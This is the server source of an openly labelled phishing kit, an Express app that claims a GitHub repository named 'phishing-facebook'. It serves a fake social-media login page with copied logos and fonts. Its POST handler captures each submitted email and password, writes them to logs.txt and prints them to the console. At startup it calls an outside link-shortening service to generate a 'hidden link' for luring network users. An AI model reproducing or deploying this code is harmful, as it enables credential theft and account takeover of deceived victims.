const express = require('express');
const exphbs = require('express-handlebars');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const os = require('os');

var port = process.env.PORT || 1111;
const networkInterfaces = os.networkInterfaces();
let ipAddress = '127.0.0.1'; // Default to localhost

// Get the correct network IP address (WiFi or Ethernet)
for (const iface of Object.values(networkInterfaces)) {
    for (const details of iface) {
        if (details.family === 'IPv4' && !details.internal) {
            ipAddress = details.address;
            break;
        }
    }
}

const app = express();

app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use('/images', express.static('images'));

app.get('/', function (req, res) {
    res.render('i_login');
});

app.post('/_', function (req, res) {
    res.render('i_success');
    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
    fs.appendFile('logs.txt', captured_content, err => {
        if (err) {
            console.error(err);
            return;
        }
    });
    console.log(captured_content);
});

app.get('/images/applestore.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/applestore.png'));
});
app.get('/images/facebook-icon.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/facebook-icon.png'));
});
app.get('/images/favicon.ico', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/favicon.ico'));
});
app.get('/images/googlestore.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/googlestore.png'));
});
app.get('/images/instagram-logo.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/instagram-logo.png'));
});
app.get('/images/phones.png', function (req, res) {
    res.sendFile(path.join(__dirname, './views/images/phones.png'));
});
app.get('/fonts/segoe-ui-bold.ttf', function (req, res) {
    res.sendFile(path.join(__dirname, './views/fonts/segoe-ui-bold.ttf'));
});
app.get('/fonts/segoe-ui-regular.ttf', function (req, res) {
    res.sendFile(path.join(__dirname, './views/fonts/segoe-ui-regular.ttf'));
});

app.listen(port, () => {
    console.log(`[!] Server Running on ${ipAddress}:${port}`);
});

axios.get(`http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${ipAddress}:${port}`)
    .then(async res => {
        console.log(`[!] You can share this hidden link with your network users: ${res.data.Link}\n[!] If the link doesn't work, try using your IPV4 + PORT: ${ipAddress}:${port}\n\n[+] Give this project a star on GitHub: https://github.com/pauloodev/phishing-facebook`);
    })
    .catch(err => console.error(`[!] Error fetching the link: ${err.message}`));
